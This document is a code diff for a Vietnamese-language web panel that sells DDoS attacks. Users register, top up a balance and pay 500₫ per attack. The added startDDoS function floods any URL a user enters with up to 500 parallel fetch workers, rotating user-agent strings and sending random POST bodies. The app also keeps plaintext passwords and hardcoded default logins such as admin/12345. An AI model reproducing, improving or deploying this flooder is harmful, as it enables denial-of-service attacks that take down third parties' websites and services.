@@ -430,7 +430,6 @@
         .status-ddos { background: #dbeafe; color: #1e40af; }
         .status-thanhcong { background: #d1fae5; color: #065f46; }
         
-        /* Profile */
         .profile-avatar {
             width: 100px;
             height: 100px;
@@ -787,4 +786,255 @@ new Vue({
                 const defaultUsers = [
                     { id:1, username:'admin', password:'12345', role:'admin', balance: Infinity, avatar: null, email: 'admin@demo.com', createdAt: '01/01/2026' },
                     { id:2, username:'user', password:'123', role:'user', balance: 20000, avatar: null, email: 'user@demo.com', createdAt: '15/06/2026' },
-                    { id:3,
+                    { id:3, username:'vip', password:'vip', role:'vip', balance: 100000, avatar: null, email: 'vip@demo.com', createdAt: '20/08/2026' }
+                ];
+                localStorage.setItem('ddos_users', JSON.stringify(defaultUsers));
+            }
+            this.users = JSON.parse(localStorage.getItem('ddos_users'));
+            this.attackLogs = JSON.parse(localStorage.getItem('ddos_attack_logs')) || [];
+            this.historyItems = JSON.parse(localStorage.getItem('ddos_history')) || [];
+        },
+        saveUsers() { localStorage.setItem('ddos_users', JSON.stringify(this.users)); },
+        saveLogs() { localStorage.setItem('ddos_attack_logs', JSON.stringify(this.attackLogs)); },
+        saveHistory() { localStorage.setItem('ddos_history', JSON.stringify(this.historyItems)); },
+        uploadAvatarProfile(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                const avatarData = e.target.result;
+                const user = this.users.find(u => u.id === this.currentUser.id);
+                if (user) {
+                    user.avatar = avatarData;
+                    this.currentUser.avatar = avatarData;
+                    this.saveUsers();
+                }
+            };
+            reader.readAsDataURL(file);
+            this.$refs.avatarInputProfile.value = '';
+        },
+        login() {
+            this.loginError = '';
+            const found = this.users.find(u => u.username === this.loginUser && u.password === this.loginPass);
+            if(found) { 
+                this.currentUser = found; 
+                this.activeMenu = 'ddos';
+                this.currentForm = 'login';
+                this.loginUser = '';
+                this.loginPass = '';
+            } else {
+                this.loginError = 'Sai tên đăng nhập hoặc mật khẩu';
+            }
+        },
+        register() {
+            if(!this.regUser || !this.regPass || !this.regEmail) return alert('Vui lòng nhập đầy đủ thông tin');
+            if(this.users.find(u => u.username === this.regUser)) return alert('Tên đã tồn tại');
+            if(this.users.find(u => u.email === this.regEmail)) return alert('Email đã được sử dụng');
+            this.users.push({ 
+                id: Date.now(), 
+                username: this.regUser, 
+                password: this.regPass, 
+                email: this.regEmail,
+                role: 'user', 
+                balance: 0, 
+                avatar: null,
+                createdAt: new Date().toLocaleDateString('vi-VN')
+            });
+            this.saveUsers();
+            alert('Đăng ký thành công! Vui lòng đăng nhập.');
+            this.regUser = '';
+            this.regPass = '';
+            this.regEmail = '';
+            this.currentForm = 'login';
+        },
+        sendResetCode() {
+            const user = this.users.find(u => u.email === this.forgotEmail);
+            if(!user) return alert('Email không tồn tại trong hệ thống');
+            const code = Math.floor(100000 + Math.random() * 900000).toString();
+            localStorage.setItem('reset_code_' + user.id, code);
+            alert('Mã xác nhận đã gửi đến email ' + this.forgotEmail + '\nMã của bạn: ' + code + ' (demo)');
+            this.forgotStep2 = true;
+        },
+        verifyResetCode() {
+            if(!this.resetCode || !this.newPassword) return alert('Vui lòng nhập đầy đủ thông tin');
+            const user = this.users.find(u => u.email === this.forgotEmail);
+            if(!user) return alert('Không tìm thấy user');
+            const savedCode = localStorage.getItem('reset_code_' + user.id);
+            if(this.resetCode !== savedCode) return alert('Mã xác nhận không đúng');
+            user.password = this.newPassword;
+            this.saveUsers();
+            alert('Đổi mật khẩu thành công! Vui lòng đăng nhập lại.');
+            this.currentForm = 'login';
+            this.forgotStep2 = false;
+            this.forgotEmail = '';
+            this.resetCode = '';
+            this.newPassword = '';
+            localStorage.removeItem('reset_code_' + user.id);
+        },
+        logout() { 
+            this.currentUser = null; 
+            this.stopFlag = true; 
+            this.isRunning = false;
+            this.currentForm = 'login';
+            this.forgotStep2 = false;
+        },
+        napTien() {
+            if(this.napAmount < 5000) return alert('Tối thiểu 5,000₫');
+            if(!this.napNote.trim()) return alert('Vui lòng nhập ghi chú chuyển khoản');
+            
+            const user = this.users.find(u => u.id === this.currentUser.id);
+            if(user) {
+                user.balance = (user.balance || 0) + this.napAmount;
+                this.currentUser.balance = user.balance;
+                this.saveUsers();
+                
+                this.historyItems.push({
+                    id: Date.now(),
+                    type: 'nap',
+                    target: 'Nạp tiền',
+                    amount: this.napAmount,
+                    note: this.napNote,
+                    status: 'Thành công',
+                    time: new Date().toLocaleString(),
+                    requests: 0
+                });
+                this.saveHistory();
+                
+                alert('Nạp ' + this.formatCurrency(this.napAmount) + '₫ thành công!');
+                this.napAmount = 5000;
+                this.napNote = '';
+            }
+        },
+        async startDDoS() {
+            if(this.isRunning) return;
+            if(!this.targetUrl.trim()) return alert('Nhập tên miền');
+            
+            let url = this.targetUrl.trim();
+            if(!url.startsWith('http://') && !url.startsWith('https://')) {
+                url = 'http://' + url;
+            }
+            
+            const maxLimit = this.isAdmin ? 999999 : 1000;
+            if(this.maxRequests > maxLimit) {
+                alert(this.isAdmin ? 'Admin không giới hạn' : 'Số lần tối đa là 1000');
+                return;
+            }
+            
+            const user = this.users.find(u => u.id === this.currentUser.id);
+            if(user && user.balance !== Infinity && user.balance !== 'vô hạn') {
+                if(user.balance < 500) return alert('Số dư không đủ 500₫');
+                user.balance -= 500;
+                this.currentUser.balance = user.balance;
+                this.saveUsers();
+            }
+
+            const historyItem = {
+                id: Date.now(),
+                target: this.targetUrl.trim(),
+                amount: 500,
+                status: 'Đang duyệt',
+                time: new Date().toLocaleString(),
+                requests: 0
+            };
+            this.historyItems.push(historyItem);
+            this.saveHistory();
+
+            this.showDone = false; 
+            this.stopFlag = false; 
+            this.isRunning = true;
+            this.statusText = 'ĐANG TẤN CÔNG...'; 
+            this.totalRequests = 0; 
+            this.currentRPS = 0;
+            this.currentAttackCount = 0;
+
+            historyItem.status = 'Đang DDoS';
+            this.saveHistory();
+
+            const targetUrl = url;
+            const maxRequests = this.maxRequests;
+            const threads = Math.min(500, Math.max(1, this.threads));
+            const method = this.method;
+
+            const uas = [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
+                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0) AppleWebKit/605.1.15'
+            ];
+
+            let requestCount = 0;
+            if(this.timerRPS) clearInterval(this.timerRPS);
+            this.timerRPS = setInterval(() => { 
+                this.currentRPS = Math.round(requestCount / 2); 
+                requestCount = 0; 
+            }, 2000);
+
+            const sendRequest = async () => {
+                while (!this.stopFlag && this.currentAttackCount < maxRequests) {
+                    try {
+                        const controller = new AbortController();
+                        const timeout = setTimeout(() => controller.abort(), 1500);
+                        const opts = {
+                            method, 
+                            headers: { 
+                                'User-Agent': uas[Math.floor(Math.random() * uas.length)], 
+                                'Cache-Control': 'no-cache' 
+                            },
+                            signal: controller.signal, 
+                            mode: 'no-cors'
+                        };
+                        if(method === 'POST') { 
+                            opts.body = 'x=' + Math.random(); 
+                            opts.headers['Content-Type'] = 'application/x-www-form-urlencoded'; 
+                        }
+                        await fetch(targetUrl, opts);
+                        clearTimeout(timeout);
+                        this.totalRequests++; 
+                        this.currentAttackCount++;
+                        requestCount++;
+                    } catch(e) {
+                        this.totalRequests++; 
+                        this.currentAttackCount++;
+                        requestCount++;
+                    }
+                }
+            };
+
+            const workers = [];
+            for(let i = 0; i < threads; i++) {
+                workers.push(sendRequest());
+            }
+            await Promise.all(workers);
+
+            clearInterval(this.timerRPS); 
+            this.currentRPS = 0;
+            
+            historyItem.requests = this.currentAttackCount;
+            historyItem.status = 'Thành công';
+            this.saveHistory();
+            
+            this.attackLogs.push({ 
+                id: Date.now(), 
+                target: targetUrl, 
+                requests: this.currentAttackCount, 
+                duration: Math.round(this.currentAttackCount / (this.threads || 1)),
+                time: new Date().toLocaleString() 
+            });
+            this.saveLogs();
+
+            if(!this.stopFlag) {
+                this.showDone = true; 
+                this.statusText = 'ĐÃ HOÀN THÀNH';
+            } else {
+                this.statusText = 'ĐÃ DỪNG';
+            }
+            this.isRunning = false;
+        }
+    },
+    mounted() { 
+        this.initData();
+    }
+});
+</script>
+</body>
+</html>
